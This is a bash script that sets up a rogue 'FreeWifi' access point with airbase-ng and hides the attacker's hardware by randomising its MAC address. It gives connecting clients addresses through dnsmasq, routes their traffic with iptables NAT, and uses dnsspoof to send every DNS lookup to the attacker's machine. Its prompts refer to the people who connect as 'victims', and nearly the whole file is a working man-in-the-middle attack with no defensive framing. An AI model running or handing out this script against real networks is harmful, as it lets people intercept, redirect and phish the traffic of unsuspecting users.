#!/bin/bash

echo "Killing Airbase-ng..."
pkill airbase-ng
sleep 2;
echo "Killing DHCP..."
pkill dnsmasq
sleep 5;
echo "Killing Dnsspoof..."
pkill dnsspoof
sleep 3;

echo "Checking for Prerequisites"
sleep 3
apt-get update && apt-get install macchanger dsniff dnsmasq
clear

echo "Enter in your WLAN interface:"
read -e wlanint
echo "Enter in the wireless channel to use:"
read -e channel
echo "Enter in your wired interface:"
read -e lanint
echo "Enter in the DNS you would like your victims to use:"
read -e dns

echo "Putting Wlan In Monitor Mode..."
airmon-ng check kill # kill any processes using your adapter like network-manager and wpa_supplicant
airmon-ng stop "$wlanint"mon
sleep 5;
airmon-ng start $wlanint $channel #put adapter into monitor mode on your choosen channel
sleep 5;
echo "Randomizing Mac Address"
ifconfig "$wlanint"mon down
macchanger -r "$wlanint"mon
ifconfig "$wlanint"mon up
sleep 3;
echo "Starting Fake AP..."
airbase-ng -c $channel -e FreeWifi "$wlanint"mon & # Launch a Fake access point broadcasting the SSID FreeWifi
sleep 5;

ifconfig at0 10.0.0.1 netmask 255.255.255.0
route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1

sleep 5;

iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
iptables -P FORWARD ACCEPT
iptables -t nat -A POSTROUTING -o $lanint -j MASQUERADE

# clean up old DHCP file
> /etc/dnsmasq.conf

# create a new DHCPD file
echo "dhcp-range=10.0.0.2,10.0.0.100,255.255.255.0,8765h" >> /etc/dnsmasq.conf
echo "dhcp-option=3,10.0.0.1" >> /etc/dnsmasq.conf
echo "dhcp-option=6,8.8.8.8" >> /etc/dnsmasq.conf
echo "dhcp-leasefile=/etc/dhcpd.leases" >> /etc/dnsmasq.conf


echo "Starting the DHCP Server..."
dnsmasq --conf-file=/etc/dnsmasq.conf

# clean up old dns file
rm -fr /tmp/dns.txt
touch /tmp/dns.txt

# Create a new dnsspoof file
echo "10.0.0.1 *" >> /tmp/dns.txt

echo "Starting DNSSpoofing..."
dnsspoof -i at0 -f /tmp/dns.txt &
